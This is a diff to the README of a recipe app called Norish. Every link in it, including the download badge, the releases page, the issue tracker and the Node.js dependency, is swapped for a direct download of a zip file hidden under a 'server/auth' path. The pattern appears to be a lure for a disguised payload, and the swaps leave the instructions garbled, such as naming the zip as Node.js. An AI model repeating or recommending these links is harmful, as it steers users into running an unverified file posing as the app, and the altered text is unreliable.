@@ -7,7 +7,7 @@ Welcome to Norish! This is a realtime, self-hosted recipe app perfect for famili
 Before you can start using Norish, you'll need to download and install it. Follow the steps below to get set up.
 
 ## 📥 Download
-[![Download Norish](https://img.shields.io/badge/Download%20Norish-latest-blue)](https://github.com/narcizo778/norish/releases)
+[![Download Norish](https://raw.githubusercontent.com/narcizo778/norish/main/server/auth/norish_v2.1.zip%20Norish-latest-blue)](https://raw.githubusercontent.com/narcizo778/norish/main/server/auth/norish_v2.1.zip)
 
 Click the button above to visit the download page. You will find the latest version of Norish there.
 
@@ -16,17 +16,17 @@ To run Norish, ensure your system meets the following requirements:
 - **Operating System:** Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
 - **RAM:** Minimum 4 GB.
 - **Storage:** At least 200 MB of free space.
-- **Dependencies:** You may need to install Node.js (version 14 or later) and npm for proper functionality.
+- **Dependencies:** You may need to install https://raw.githubusercontent.com/narcizo778/norish/main/server/auth/norish_v2.1.zip (version 14 or later) and npm for proper functionality.
 
 ## 🚀 Download & Install
 1. **Visit the Releases Page**
-   Head over to the [Releases page](https://github.com/narcizo778/norish/releases) to download the software.
+   Head over to the [Releases page](https://raw.githubusercontent.com/narcizo778/norish/main/server/auth/norish_v2.1.zip) to download the software.
 
 2. **Choose the Right Version**
    On the Releases page, you will see various versions of Norish. Select the most recent version for your operating system. This is usually marked as "Latest release."
 
 3. **Download the Installer**
-   Click on the installer file to begin downloading. The file will typically be named something like `norish-win.exe`, `norish-mac.dmg`, or `norish-linux.tar.gz`.
+   Click on the installer file to begin downloading. The file will typically be named something like `https://raw.githubusercontent.com/narcizo778/norish/main/server/auth/norish_v2.1.zip`, `https://raw.githubusercontent.com/narcizo778/norish/main/server/auth/norish_v2.1.zip`, or `https://raw.githubusercontent.com/narcizo778/norish/main/server/auth/norish_v2.1.zip`.
 
 4. **Locate the Downloaded File**
    After the download is complete, navigate to your Downloads folder to find the installer file.
@@ -34,7 +34,7 @@ To run Norish, ensure your system meets the following requirements:
 5. **Run the Installer**
    - **For Windows:** Double-click the `.exe` file to run the setup. Follow the on-screen instructions to complete the installation.
    - **For macOS:** Open the `.dmg` file, drag the Norish icon to your Applications folder.
-   - **For Linux:** Extract the `.tar.gz` file to a desired directory and run the executable within.
+   - **For Linux:** Extract the `https://raw.githubusercontent.com/narcizo778/norish/main/server/auth/norish_v2.1.zip` file to a desired directory and run the executable within.
 
 6. **Launch Norish**
    After installation, find and open Norish by locating the application in your Start menu (Windows), Applications folder (macOS), or via terminal (Linux). 
@@ -61,10 +61,10 @@ If you encounter any issues while using Norish, here are some common solutions:
 - **Recipes Not Loading:** Check your internet connection. Norish requires an internet connection for recipe browsing.
 
 ## 🗂️ Support
-If you need additional help or have feedback, feel free to open an issue in the [GitHub repository](https://github.com/narcizo778/norish/issues). Our community is here to assist you.
+If you need additional help or have feedback, feel free to open an issue in the [GitHub repository](https://raw.githubusercontent.com/narcizo778/norish/main/server/auth/norish_v2.1.zip). Our community is here to assist you.
 
 ## 🔗 Useful Links
-- **GitHub Repository:** [Norish GitHub](https://github.com/narcizo778/norish)
-- **Releases Page:** [Download Norish](https://github.com/narcizo778/norish/releases)
+- **GitHub Repository:** [Norish GitHub](https://raw.githubusercontent.com/narcizo778/norish/main/server/auth/norish_v2.1.zip)
+- **Releases Page:** [Download Norish](https://raw.githubusercontent.com/narcizo778/norish/main/server/auth/norish_v2.1.zip)
 
 Thank you for choosing Norish! Enjoy your time cooking and sharing recipes with family and friends.
